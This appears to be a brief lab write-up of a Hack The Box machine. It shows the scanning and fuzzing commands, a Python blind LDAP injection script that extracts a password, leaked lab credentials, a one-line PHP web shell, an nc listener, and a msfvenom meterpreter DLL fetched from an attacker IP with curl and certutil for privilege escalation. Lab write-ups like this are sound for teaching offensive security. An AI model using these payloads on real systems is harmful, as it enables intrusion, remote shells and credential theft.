#ldap_injection #dll_injection
## Scan nmap

```sh
➜  ~ nmap 10.10.11.250
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 13:42 CET
Nmap scan report for analysis.htb (10.10.11.250)
Host is up (0.027s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3306/tcp open  mysql

```

## sub-domain enumeration
```sh
➜  ~ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://analysis.htb/ -H 'Host: FUZZ.analysis.htb'

internal               
```

target : http://internal.analysis.htb/
## Directory enumeration
```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/FUZZ -e .php

users p                
dashboard                                 
employees                             
```
## file enumeration
```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://internal.analysis.htb/users/FUZZ  -e .php

users: 

list.php
```

```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://internal.analysis.htb/employees/FUZZ  -e .php

employees: 

login.php
```

```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://internal.analysis.htb/dashboard/FUZZ  -e .php

dashboard : 

index.php              
img                  
uploads               
upload.php      
details.php           
css                    
Index.php             
lib                     
form.php              
js                     
logout.php             
tickets.php             
emergency.php           
Form.php                
```

## Parameter Enumeration : 

```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u "http://internal.analysis.htb/users/list.php?FUZZ=key" -fs 17
 
name 

 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u "http://internal.analysis.htb/users/list.php?name=*)(FUZZ=*" 
 
Description 
```

## Brute force Description : 

Python code : 
```python
import requests

def main():
	url=f'http://internal.analysis.htb/users/list.php?name=*)(description='
	charset='ABCDEFGHIJKLMNOPQRSTUVXYZabcdefghijklmnopqrstuvxyz0123456789/*-+.;_()'

	charset = list(charset.strip(''))
	while True :
		for i in range(69):
			answer = url + charset[i]
			send = answer + "*"
			r=requests.get(send, stream=True).headers['Content-length']
		
			if  "418" in r or "8"in r : 
				print(answer + "\nGood characters")
				url= answer
				break
			else:
				None	

if __name__ == '__main__':
	main()
```

`Creds : Technician/technician@analysis.htb | 97NTtl*4QP96Bv`

rlwrap nc -nlvp 4242
php web shell: 

```php
<?php system($_GET['cmd']); ?>
```

`creds : jdoe | 7y4Z4^*y9Zzj`

```sh
crackmapexec winrm 10.10.11.250 -u jdoe -p "7y4Z4^*y9Zzj"
evil-winrm -i 10.10.11.250 -u jdoe -p '7y4Z4^*y9Zzj'
```

## Privesc

```sh
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.167 LPORT=4242 -f dll > sf_engine.dll

curl -o sf_engine.dll http://10.10.14.93:8080/sf_engine.dll

certutil -urlcache -split -f http://10.10.14.237:8080/sf_engine.dll sf_engine.dll
```

